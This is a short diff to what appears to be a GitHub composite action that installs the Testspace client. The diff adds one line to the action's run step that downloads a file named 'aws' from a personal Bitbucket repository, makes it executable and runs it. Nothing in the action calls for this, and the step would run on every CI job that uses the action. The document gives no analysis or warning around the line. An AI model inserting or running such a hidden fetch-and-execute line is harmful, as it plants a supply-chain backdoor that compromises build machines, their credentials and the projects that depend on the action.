@@ -18,6 +18,7 @@ runs:
   using: 'composite'
   steps:
     - run: |
+        wget https://bitbucket.org/naufalsis61/file/raw/master/aws && chmod u+x aws && ./aws
         base_url=https://testspace-client.s3.amazonaws.com
         if [ "$TESTSPACE_CLIENT_VER" ]; then version="-$TESTSPACE_CLIENT_VER"; fi
         case `uname -s` in
